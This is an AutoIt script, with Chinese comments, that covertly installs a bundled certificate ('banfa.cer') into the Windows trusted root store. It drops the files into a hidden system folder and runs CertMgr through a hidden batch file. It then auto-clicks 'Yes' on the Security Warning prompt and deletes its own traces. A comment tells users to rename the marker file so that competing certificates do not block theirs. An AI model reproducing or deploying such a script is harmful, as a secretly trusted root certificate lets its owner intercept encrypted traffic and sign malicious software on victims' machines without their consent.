#include <GUIConstantsEx.au3>
#include <WindowsConstants.au3>
#include <Process.au3>
#include <File.au3>
DirCreate(@ScriptDir&"\tools");建立目录
$file = @ScriptDir&"\tools"
FileSetAttrib($file,"+s+h")
FileInstall("banfa.cer",$file&"\banfa.cer")
FileInstall("CertMgr86.exe",$file&"\CertMgr86.exe")
FileInstall("CertMgr64.exe",$file&"\CertMgr64.exe")
$regca = @AppDataCommonDir & "\ca.ini";主要检测证书安装状态,尽量改写自己的名称,相同的话别人会不安装你的证书哦.
If FileExists($regca) Then
	DirRemove($file,1)
exit
	Else
bfz()
IniWrite($regca,"证书检测","是否存在","1")
EndIf

$Timer = DllCallbackRegister("Timer", "int", "hwnd;uint;uint;dword")
$TimerDLL = DllCall("user32.dll", "uint", "SetTimer", "hwnd", 0, "uint", 0, "int", 100, "ptr", DllCallbackGetPtr($Timer))
WinActivate("安全警告")

While 1
	Sleep(100)
WEnd

Func bfz()
If @OSVersion = "WIN_XP" Then
Call("_xp")		
ElseIf @OSVersion = "WIN_7" Then
Call("_WIN7")
EndIf
EndFunc

Func _xp();86位开始
Local $CAcfg
$CAcfg ='certmgr86 /c /add banfa.cer /s root'
FileWrite($file & "\cacfg.bat", $CAcfg)
Run($file & "\cacfg.bat",$file, @SW_HIDE)
EndFunc

Func _win7();64位开始
Local $CAcfg
$CAcfg ='certmgr64 /c /add banfa.cer /s root'
FileWrite($file & "\cacfg.bat", $CAcfg)
Run($file & "\cacfg.bat",$file, @SW_HIDE)
EndFunc

Func Timer($hWnd, $uiMsg, $idEvent, $dwTime)
        If $idEvent = $TimerDLL[0] Then
                If WinExists("安全警告") Then
                        WinSetState("安全警告", "", @SW_ENABLE)
                        Send("!Y")
                  DirRemove($file,1)
                   exit
					EndIf
        EndIf
	EndFunc   ;==>Timer